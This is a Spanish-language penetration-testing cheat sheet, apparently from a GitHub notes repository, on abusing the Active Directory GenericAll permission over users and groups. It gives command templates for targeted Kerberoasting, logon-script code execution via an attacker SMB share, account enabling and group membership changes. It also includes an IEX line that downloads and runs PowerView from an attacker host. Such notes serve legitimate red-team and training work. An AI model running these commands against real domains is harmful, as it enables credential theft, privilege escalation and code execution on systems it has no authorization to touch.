## Abuso de GenericAll (Usuario sobre Usuario)

`GenericAll` es el permiso más amplio en Active Directory — otorga control total sobre el objeto objetivo. Si un usuario tiene `GenericAll` sobre otro, puede obtener su hash NT, habilitarlo/deshabilitarlo, cambiarle la contraseña y modificar cualquier propiedad del usuario.

**Orden de prioridad recomendado:**
1. Obtener el hash NT via Shadow Credentials
2. Si no es posible, obtener el hash Kerberoastable
3. Si el usuario se conecta frecuentemente, abusar del script de inicio de sesión (RCE)
4. Como último recurso, cambiar la contraseña

---

### Shadow Credentials (obtener hash NT)

Consultar la sección de Shadow Credentials:
https://github.com/ArtesOscuras/Notes/blob/main/abusing_DACLs/AddKeyCredentialLink%20(SHADOW%20CREDENTIALS).md

---

### Targeted Kerberoast (obtener hash Kerberoastable)

El usuario objetivo debe estar habilitado. Puede ser necesario sincronizar el reloj con el DC.

#### Desde Linux (externamente)

```shell
# Con contraseña
targetedKerberoast.py -v -d '<dominio>' -u '<usuario_controlado>' -p '<contraseña>'

# Con hash NT
targetedKerberoast.py -v -d '<dominio>' -u '<usuario_controlado>' -H :<hash_nt>
```

Con autenticación Kerberos:

```shell
getTGT.py <dominio>/<usuario>:<contraseña> -dc-ip <ip_dc>
export KRB5CCNAME=<archivo.ccache>
targetedKerberoast.py -v -d '<dominio>' -u '<usuario>' -p '<contraseña>' -k --dc-host <maquina.dominio>
```

> 💡 Si aparece el error `KRB_AP_ERR_SKEW`, sincronizar el reloj con el DC antes de continuar.

#### Desde Windows (internamente)

```powershell
# Cargar PowerView
IEX (new-object net.webclient).downloadstring('http://<ip_atacante>/powerview.ps1')

# Verificar que el usuario no tiene SPN
Get-DomainUser '<usuario_victima>' | Select serviceprincipalname

# Asignar SPN falso
Set-DomainObject -Identity 'usuario_victima' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

# Obtener el hash
$User = Get-DomainUser '<usuario_victima>'
$User | Get-DomainSPNTicket | fl
```

---

### Habilitar usuario o modificar propiedades

#### Desde Linux (externamente)

```shell
ldap_shell.py '<dominio>/<usuario_controlado>:<contraseña>' -dc-ip <ip>
# Dentro de la shell interactiva:
enable_account <usuario>
```

#### Desde Windows (internamente)

Usar `Set-DomainObject` o PowerView directamente desde la máquina comprometida.

---

### Establecer script de inicio de sesión (RCE si el usuario se conecta)

#### Desde Linux (externamente)

```shell
bloodyAD --host '<ip_dc>' -d '<dominio>' -u '<usuario_controlado>' -p '<contraseña>' \
  set object <usuario_objetivo> msTSInitialProgram -v '\\1.2.3.4\share\archivo.exe'
```

#### Desde Windows (internamente)

Usar PowerView o `Set-DomainObject` con el atributo `msTSInitialProgram`.

---

### Cambiar contraseña del usuario

Si ninguna opción anterior es viable, cambiar la contraseña y usarla para conectar via WinRM, RDP, etc.

Consultar la sección de ForceChangePassword:
https://github.com/ArtesOscuras/Notes/blob/main/abusing_DACLs/ForceChangePassword.md

---

## Abuso de GenericAll (Usuario sobre Grupo)

Con `GenericAll` sobre un grupo se puede añadir cualquier usuario al mismo y modificar sus propiedades.

### Añadir un usuario al grupo

#### Desde Linux (externamente)

```shell
# Samba tools
net rpc group addmem '<grupo_objetivo>' '<usuario_objetivo>' \
  -U '<dominio>'/'<usuario_controlado>'%'<contraseña>' -S <ip_dc>

# BloodyAD
bloodyAD --host '<ip>' -d '<dominio>' -u '<usuario_controlado>' -p '<contraseña>' \
  add groupMember '<grupo_objetivo>' '<usuario_objetivo>'
```

#### Desde Windows (internamente)

```powershell
net group '<grupo_objetivo>' <usuario_objetivo> /add /domain
```

> 💡 `GenericAll` sobre un grupo es funcionalmente equivalente a `AddSelf` y `GenericWrite` combinados — permite tanto añadir miembros como modificar los atributos del grupo.

---

### Referencias

- https://www.hackingarticles.in/genericall-active-directory-abuse/
- https://www.thehacker.recipes/ad/movement/dacl/logon-script
